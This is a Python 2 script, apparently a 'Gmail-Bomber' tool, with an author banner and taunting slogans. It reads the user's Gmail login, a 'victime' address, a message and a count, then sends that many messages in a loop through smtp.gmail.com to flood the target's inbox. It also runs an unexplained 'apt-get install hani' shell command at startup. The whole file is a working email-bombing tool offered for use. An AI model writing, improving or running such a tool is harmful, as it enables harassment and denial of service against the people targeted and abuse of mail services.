# -*- coding: utf-8 -*-
# %%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
#%%%%%%%%%%%%%%%%%%%%%%%%%%%%% Date: March 26 , 2018 %%%%%%%%%%%%%%%%%%%%%%%%%%%%%
#%%%%%%%%%%%%%%%%%%%%%%%%%% Weather: It's always cool in the lab %%%%%%%%%%%%%%%%
#%%%%%%%%%%%%%%%%%%%%%%%%%%% Health: Overweight %%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
#%%%%%%%%%%%%%%%%%%%%%%%%% Caffeine: 12975 mg %%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
#%%%%%%%%%%%%%%%%%%%%%%%%%%% Hacked: All the things %%%%%%%%%%%%%%%%%%%%%%%%%%%%%
#%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
# By :                       Lamani Fodil Hani (VEGETA-LFH)     
# Fb :                           Lamani Fodil Hani              
# Github :                    www.github.com/lamanihani      
# Gmail :                       lamanihani1@gmail.com  
############################################# Import some lib #############################
import os
import random
import smtplib
import sys
import getpass
import time
############################ JUST a SHIT ###################
print("[!] Intall Package :")
os.system('apt-get install hani')
os.system('clear')
rania1 = ("            #do you even \033[91mexist\033[97m ")
rania2 = ('''          #Im \033[92mgood\033[97m at reading \033[93mpeople
          \033[97mMy \033[91msecret\033[97m ? I look for the \033[96mworst\033[97m in them\033[97m''')
rania3 = ("            #'\033[91mlove \033[97mis foreever' \033[97mbullshit\033[97m")
rania4 = ("            #we live in a kingdom of \033[91mbullshit\033[97m")
rania5 = ("            #LEAVE ME \033[91mHERE \033[97m!")
rania6 = ("            #LEAVE ME \033[91mHERE \033[97m!")
def kf_art():
    arts = [rania1, rania2, rania3,rania4,rania5,rania6]
    return random.choice(arts)
print ('''\033[1;31m  \033[97m 
      ________               .__.__              __________              ___.                 
     /  _____/  _____ _____  |__|  |             \______   \ ____   _____\_ |__   ___________ 
    /   \  ___ /     |___  \ |  |  |     ______   |    |  _//  _ \ /     \| __ \_/ __ \_  __ 
    \    \_\  \  Y Y  \/ __ \|  |  |__  /_____/   |    |   (  <_> )  Y Y  \ \_\ \  ___/|  | \/
     \______  /__|_|  (____  /__|____/            |______  /\____/|__|_|  /___  /\___  >__|   
            \/      \/     \/                            \/             \/    \/     \/      
                                                                      By \033[93mVEGETA-LFH \033[97mツ
''') 
print(kf_art())
print(" ")
#########################   USER INFO ##########################
user = raw_input('\033[94m[?] \033[97mYour \033[92mGmail\033[97m :\033[93m ')
passworde = getpass.getpass('\033[94m[?]\033[97m Your \033[91mPassword\033[97m :\033[93m ')
print(" ")
victime = raw_input('\033[94m[?]\033[97m The victime \033[91mEMAIL\033[97m : \033[93m')
message = raw_input('\033[94m[?]\033[97m Your \033[92mMessage\033[97m : \033[93m')
print(" ")
hani = input('\033[94m[?] \033[97mNumber of \033[92msend\033[97m : \033[93m')
print(" ")
print("\033[94m[*] \033[97mSending : ")
############################### SMTP_SERVER INFO ##################
smtp_server = 'smtp.gmail.com'
port = 587

##########################  Login ############################
try:
    server = smtplib.SMTP(smtp_server,port) 
    server.ehlo()
    if smtp_server == "smtp.gmail.com":
            server.starttls()
    server.login(user,passworde)
###################### SENDING #########################################
    for i in range(1, hani+1):
        subject = os.urandom(9)
        msg = 'From: ' + user + '\nSubject: ' + subject + '\n' + message
        server.sendmail(user,victime,msg)
        print "\033[94m[✔]\033[97m Email \033[92mSENT\033[97m  :\033[93m %i" % i
        sys.stdout.flush()
    server.quit()
    print '\033[93m[✔]\033[97m All \033[97mMessage was\033[92m sent\033[97m '
    
    
except KeyboardInterrupt:
    print '[✘] Canceled'
    sys.exit()
except smtplib.SMTPAuthenticationError:
    print(" ")
    print("\033[94m[✘] \033[91mError \033[97m:")
    print '\033[94m[✘] \033[97mThe \033[93musername \033[97mor \033[93mpassword \033[97myou entered is incorrect.'
    print "\033[94m[!] \033[97mCheck if the Options of 'Applications are less secure' is enabled "
    sys.exit()


